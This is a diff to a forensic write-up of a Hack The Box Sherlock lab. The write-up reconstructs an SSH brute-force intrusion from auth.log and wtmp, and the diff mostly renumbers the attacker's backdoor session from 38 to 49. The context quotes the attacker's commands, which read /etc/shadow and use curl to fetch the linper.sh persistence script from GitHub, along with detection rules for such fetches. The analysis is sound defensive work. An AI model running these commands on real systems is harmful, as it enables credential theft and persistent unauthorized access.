@@ -117,7 +117,7 @@ Record: type=7, pid=2549, line=pts/1, user=root, host=65.2.161.68, time=2024-03-
 
 Forensic analysis required strict normalization to **UTC**. By reading the binary epoch seconds directly (`1709706765`) and applying `time.gmtime()`, the true UTC timestamp was confirmed:
 
-$$\text{Epoch } 1709706765 \xrightarrow{\text{gmtime}} \text{2024-03-06 06:32:45 UTC}$$
+**Epoch 1709706765 → 2024-03-06 06:32:45 UTC (gmtime)**
 
 This synchronizes with the `auth.log` syslog entry at `Mar 6 06:32:45`.
 
@@ -243,14 +243,17 @@ The table below summarizes the eight Hack The Box Sherlock questions, official v
      Line 359: Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
      ```
      Corroborating this, `wtmp` records a `DEAD_PROCESS` entry for PID `2491` with timestamp `2024-03-06 06:37:24 UTC`.
-  3. *Session 38 (Attacker's SECOND Session via Backdoor):* Commenced 10 seconds later at `06:37:34 UTC` (Line 360) under username `cyberjunkie` (PID 2642), terminating at `06:40:08 UTC` (Line 382).
+  3. *Session 49 (Attacker's SECOND Session via Backdoor):* Commenced 10 seconds later at `06:37:34 UTC` (Line 360) under username `cyberjunkie` (PID 2642), terminating at `06:40:08 UTC` (Line 382).
+*Note on Session Identifier Progression (Session 37 to Session 49):*
+In `auth.log`, the attacker's initial root session is registered as **Session 37** (Line 324, `06:32:45 UTC`), while the subsequent `cyberjunkie` backdoor session is registered as **Session 49** (Line 362, `06:37:34 UTC`). During the interval between these two interactive sessions, auth.log records recurring background PAM sessions (10 cron sessions for user confluence and 1 cron session for user root between 06:33 and 06:37 UTC). The logs also show internal systemd-logind session counter increments. The available evidence does not establish the precise mechanism behind the progression from Session 37 to Session 49.
+
 
   Therefore, the first SSH session ended exactly at **`2024-03-06 06:37:24`**.
 
 #### Question 8: Full Sudo Command Used to Download Script
 - **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 - **Forensic Evidence & Command Breakdown:**
-  While logged in as `cyberjunkie` during Session 38, the attacker executed administrative commands via `sudo`:
+  While logged in as `cyberjunkie` during Session 49, the attacker executed administrative commands via `sudo`:
   - `06:38:00 UTC` (Line 364): `sudo: COMMAND=/usr/bin/cat /etc/shadow` (credential harvesting)
   - `06:39:38 UTC` (Line 375):
     ```syslog
@@ -279,10 +282,10 @@ The following high-resolution timeline documents the attacker's activities from 
 | `2024-03-06 06:35:10` | `usermod[2628]` | T1548.003 Priv Escalation | User `cyberjunkie` added to supplementary administrative group **`sudo`**. |
 | `2024-03-06 06:37:24` | `sshd[2491]` / `systemd[411]` | Session Disconnect | **First SSH Session (37) ended** by user disconnect from `65.2.161.68:53184`. |
 | `2024-03-06 06:37:34` | `sshd[2642]` | Lateral Movement / Access | Attacker re-authenticates via SSH as backdoor user **`cyberjunkie`** from `65.2.161.68:53232`. |
-| `2024-03-06 06:37:34` | `systemd-logind[411]` | Session Start | `systemd-logind` assigns **Session 38** to `cyberjunkie` on `pts/1`. |
+| `2024-03-06 06:37:34` | `systemd-logind[411]` | Session Start | `systemd-logind` assigns **Session 49** to `cyberjunkie` on `pts/1`. |
 | `2024-03-06 06:38:00` | `sudo[2667]` | T1003.008 Credential Access | `cyberjunkie` executes `sudo /usr/bin/cat /etc/shadow` to dump password hashes. |
 | `2024-03-06 06:39:38` | `sudo[2682]` | T1059.004 / T1105 Tooling | `cyberjunkie` executes `sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`. |
-| `2024-03-06 06:40:08` | `sshd[2642]` / `systemd[411]` | Session Disconnect | Attacker logs out of Session 38 (`cyberjunkie` disconnected). |
+| `2024-03-06 06:40:08` | `sshd[2642]` / `systemd[411]` | Session Disconnect | Attacker logs out of Session 49 (`cyberjunkie` disconnected). |
 
 ---
 
@@ -295,7 +298,7 @@ The following high-resolution timeline documents the attacker's activities from 
 | **1. Credential Spraying** | High-speed dictionary brute force (~5 attempts/sec) | 48 failed attempts from `65.2.161.68` across `server_adm`, `svc_account`, `admin`, `backup`, `root`. |
 | **2. Interactive Compromise** | Compromised root password via SSH port 22 | Accepted login at `06:32:44 UTC`; spawned Session 37 on `pts/1`. |
 | **3. Backdoor Provisioning** | Created persistent redundant administrator | Provisioned local account `cyberjunkie`, set password, added to group `sudo`. |
-| **4. Identity Handoff** | Disconnected root; re-authenticated as backdoor | Terminated Session 37 at `06:37:24 UTC`; logged in as `cyberjunkie` (Session 38) at `06:37:34 UTC`. |
+| **4. Identity Handoff** | Disconnected root; re-authenticated as backdoor | Terminated Session 37 at `06:37:24 UTC`; logged in as `cyberjunkie` (Session 49) at `06:37:34 UTC`. |
 | **5. Post-Exploitation Sudo** | Shadow dumping and persistence tool ingress | Executed `sudo cat /etc/shadow` and `sudo curl linper.sh` persistence framework. |
 
 ### 6.1 Attack Techniques Analysis
@@ -382,7 +385,7 @@ To mitigate SSH brute-force vulnerabilities, prevent unauthorized root access, a
 |:---|:---|:---|
 | **Ingress Boundary** | Eliminate password attacks & restrict exposure | • Disable passwords: `PasswordAuthentication no` (mandate Ed25519/RSA keys)<br>• Disable root login: `PermitRootLogin no`<br>• Restrict port 22 via AWS Security Groups / VPN<br>• Deploy Fail2ban (ban after 3 failures in 5 min) |
 | **Host Hardening** | Enforce least privilege & system auditing | • Require re-authentication for `sudo`; restrict wildcard commands<br>• Deploy `auditd` rules on account modification binaries (`useradd`, `usermod`)<br>• Restrict outbound egress HTTP/HTTPS from servers |
-| **SOC SIEM Correlation** | Rapid detection & alert generation | • Alert on $>10$ SSH failures in 60s followed by success from same IP<br>• Alert on execution of `useradd`/`usermod` by unexpected processes<br>• Alert on interactive `sudo` execution of network fetch tools (`curl`, `wget`) |
+| **SOC SIEM Correlation** | Rapid detection & alert generation | • Alert on > 10 SSH failures in 60s followed by success from same IP<br>• Alert on execution of `useradd`/`usermod` by unexpected processes<br>• Alert on interactive `sudo` execution of network fetch tools (`curl`, `wget`) |
 
 ### 10.1 Recommended SSH Configuration (`/etc/ssh/sshd_config`)
 
